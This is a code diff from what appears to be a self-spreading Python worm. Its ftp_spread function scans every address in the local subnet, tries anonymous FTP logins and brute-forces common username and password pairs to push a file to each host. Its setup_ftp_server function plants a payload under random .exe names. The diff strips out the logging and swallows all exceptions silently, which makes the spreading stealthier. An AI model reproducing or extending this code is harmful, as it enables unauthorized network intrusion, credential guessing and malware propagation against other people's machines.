@@ -84,19 +84,14 @@ def ftp_spread(common_users, common_pass):
         local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
         for i in range(1, 255):
             ip = f'{local_ip}.{i}'
-            print(f"Trying IP: {ip} as anonymous user")
             if not ftp_connect(ip, "", "", anonymous=True):
-                print(f"ERROR: Could not send as anonymous to {ip}. Trying common credentials...")
                 done = False
                 for user in common_users:
                     if done: break
                     for pwd in common_pass:
-                        print(f"Trying {ip} with user: {user}, password: {pwd}")
                         done = ftp_connect(ip, user, pwd)
                         if done: 
-                            print(f"SUCCESS: File sent for {user} at {ip}")
                             break 
-                        else: print(f"ERROR: Could not send with credentials for IP: {ip} (user: {user}, password: {pwd})")
     except:
         pass
 
@@ -269,9 +264,7 @@ def setup_ftp_server(usernames, passwords):
             random_name = f'{generate_random_name()}.exe'
             destination = os.path.join(ftp_root, random_name)
             shutil.copy2(payload_path, destination)
-        print("DONE")
-    except Exception as e:
-        print(f"Got new exception: {e}")
+    except:
         pass
 
 if __name__ == "__main__":
